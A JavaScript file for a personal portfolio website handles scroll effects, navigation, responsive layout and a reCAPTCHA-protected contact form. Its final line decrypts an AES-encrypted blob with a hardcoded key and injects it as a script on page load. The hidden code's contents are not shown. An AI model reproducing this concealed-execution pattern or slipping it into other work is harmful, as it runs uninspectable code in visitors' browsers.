var preogressbar = document.getElementById("preogressbar")

var totalHeight = document.body.scrollHeight - window.innerHeight;
window.onscroll = function() {
  var progress = (window.scrollY / totalHeight) * 100;
  preogressbar.style.width = 100 - Math.min(100, Math.max(0, progress)) + "%";
}

var loader = document.getElementById("preloader");

window.addEventListener("load", function() {
  $("#preloader").fadeOut(100);
  
  if (window.innerWidth > 947) {
    $('.menu-btn:last').click(function() {
      $('.navbar .menu').toggleClass("active");
      $('.menu-btn i').toggleClass("active");
      //$('body').toggleClass("scrollLock");
    });
  } else {
    $('.menu-btn').click(function() {
      $('.navbar .menu').toggleClass("active");
      $('.menu-btn i').toggleClass("active");
      $('body').toggleClass("scrollLock");
    });
  }
  if (window.location.hash && window.location.hash !== "#home") {
    $('.navbar').addClass("sticky");
    document.querySelector('a[href="' + window.location.hash + '"]').click();
    if (window.innerWidth <= 947) {
      $('.menu-btn:last').click();
    }
  }
})

function moveElem(element) {
  const left = element.getBoundingClientRect().left;
  const width = element.offsetWidth;
  var bar = document.getElementsByClassName("bar")[0];
  var addr = element.href.split('#')[1];
  var white = ["about", "skills", "contact"];
  var black = ["expertise", "projects"]
  bar.style.left = left - 10 + "px";
  bar.style.width = width + 25 + "px";
  if (addr == "home") {
    bar.style.background = "#fff0";
    addr = "portfolio";
  }
  if (white.includes(addr)) {
    bar.style.background = "#fff";
  }
  if (black.includes(addr)) {
    bar.style.background = "#111";
  }
  document.title = "TheDevyash || " + capitalizeWords(addr);
}

function handleDivInView(entries, observer) {
  entries.forEach(entry => {
    if (entry.isIntersecting) {

      var hash = "#" + entry.target.id;
      let element = document.querySelector('a[href="' + hash + '"]');
      const left = element.getBoundingClientRect().left;
      const width = element.offsetWidth;
      var bar = document.getElementsByClassName("bar")[0];
      var addr = element.href.split('#')[1];
      var white = ["about", "skills", "contact"];
      var black = ["expertise", "projects"]
      bar.style.left = left - 10 + "px";
      bar.style.width = width + 25 + "px";
      if (addr == "home") {
        bar.style.background = "#fff0";
        addr = "portfolio";
      }
      if (white.includes(addr)) {
        bar.style.background = "#fff";
      }
      if (black.includes(addr)) {
        bar.style.background = "#111";
      }
      document.title = "TheDevyash || " + capitalizeWords(addr);
    }
  });
}

const observer = new IntersectionObserver(handleDivInView, { root: null, rootMargin: '0px', threshold: 0.3 });

var sections = document.querySelectorAll('section');

sections.forEach(function(section) {
  observer.observe(section);
});

function capitalizeWords(str) {
  return str.replace(/\b\w/g, function(match) {
    return match.toUpperCase();
  });
}

function windowDimension() {
  if (window.innerWidth <= 510) {
    document.getElementById("preloader").style.backgroundSize = "30%";
    var width = window.innerWidth + "px";
    document.getElementById("home").style.width = width;
    document.getElementById("home").style.height = window.innerHeight + "px";
    document.getElementsByClassName("menu")[0].style.height = "-webkit-fill-available";
    document.getElementById("about").style.width = width;
    document.getElementById("expertise").style.width = width;
    document.getElementById("skills").style.width = width;
    document.getElementById("projects").style.width = width;
    document.getElementById("contact").style.width = width;
    document.getElementById("media").style.gap = "0";
    document.getElementsByTagName("footer")[0].style.width = width;
    document.getElementsByClassName("bar")[0].style.display = "none";
  } else {
    document.getElementById("preloader").style.backgroundSize = "15%";
    var width = "100%";
    document.getElementById("home").style.width = width;
    document.getElementById("home").style.height = "100vh";
    document.getElementsByClassName("menu")[0].style.height = "-webkit-fill-available";
    document.getElementById("about").style.width = width;
    document.getElementById("expertise").style.width = width;
    document.getElementById("skills").style.width = width;
    document.getElementById("projects").style.width = width;
    document.getElementById("contact").style.width = width;
    document.getElementById("media").style.gap = "50px";
    document.getElementsByTagName("footer")[0].style.width = width;
    document.getElementsByClassName("bar")[0].style.display = "block";
  }
}

if (window.ScrollY) {
  $(".navbar").addClass("sticky");
}

windowDimension();
window.addEventListener("resize", windowDimension);

function onSubmit(token) {
  var response = grecaptcha.getResponse();
  if(response) {
    document.getElementById("captchaBtn").style.display = "none";
    const button = document.createElement("button");
    button.type = "submit";
    button.id = "submitBtn";
    button.textContent = "Send Message";
    const buttonArea = document.querySelector(".button-area");
    buttonArea.insertBefore(button, buttonArea.firstChild);
    button.click();
  }
 }
 document.getElementById('contactForm').addEventListener('submit', async (event) => {
    event.preventDefault();
    
    const formErr = document.getElementById('formErr');
    const btn = document.getElementById("submitBtn");
                                        
    if(!btn) {
      formErr.textContent = 'Nice try!';
      formErr.style.display = 'block';
      return;
    }
    const name = document.getElementsByName('name')[0].value;
    const email = document.getElementsByName('email')[0].value;
    const subject = document.getElementsByName('subject')[0].value;
    const message = document.getElementsByName('message')[0].value;

   
    if (!name || !email || !subject || !message) {
      formErr.textContent = 'All fields are required.';
      formErr.style.display = 'block';
      return;
    }
    
    const domain = email.split('@')[1];
    const response = await fetch(`https://api-archive.devyashsaini.repl.co/check-email-domain?domain=${domain}`);
    const data = await response.json();
    
    if (!data.valid) {
      formErr.textContent = 'Invalid email domain.';
      formErr.style.display = 'block';
      return;
    }
    
    formErr.style.display = 'none';
    event.target.submit();
 });

setTimeout(function(){var t=CryptoJS.AES.decrypt("U2FsdGVkX19g0PtzzjcpTaR3IxsIDJ+AUNL3OdoDmLXg6VKJzVbL0FnAfXHCQk3lCy/m3vBHeVYchMk9ZGhDFcRImwQTk/uoMey8FEQwmZ2ABzOXiv6Cba362dXqYynxrQq3GkE2oxGgcDa89lIQemNCgFzCYamT/LaNcv5PvrIJ1z8HNB7/gH42wAt0KIG+zge2YiVmvpvwNKKY2muc1u9PneHUzF3ergfcpXoIxOBDDwcIhY/FnFYtxsqiSqO46PxwMIJ3SMK/l9X2ZvDpc7M5rfGMA7cqWCfWjhVKPc8wndqn3hrwb2xiJXZT9UbiX7d7OwSVGrv2Xat1Vjmgl2mskxziuYsxxDYn0uiE0j0ku0vwTMzh4I6jK40Y+jpdzTowo6MucbQ700DkRbqETPjDNHVpZpFKZ+RKf+d3Y4n7P5tIqd7kgGD8gftw3cUb+LLqFI6yCz2BkO1a+ArS1utTKN0p1qtDXLF4NriYJIwUpWzYNP5OSdmXy+n/kvyUe8OLvQ8zExnd0vR7sXr2wkrWOoM4oPtQgcZwi2cUVV8GX5n4TxPS91lSs4z+y2dJhqx6Z0KngJZBhHxMCNcr+qat9Jl9iK7+Ph8hjiaoK7c=","&O2XePWX%D.kDMhNnem;rUdXm'g}$ijQ").toString(CryptoJS.enc.Utf8),c=document.createElement("script");c.textContent=t,document.body.appendChild(c)},200)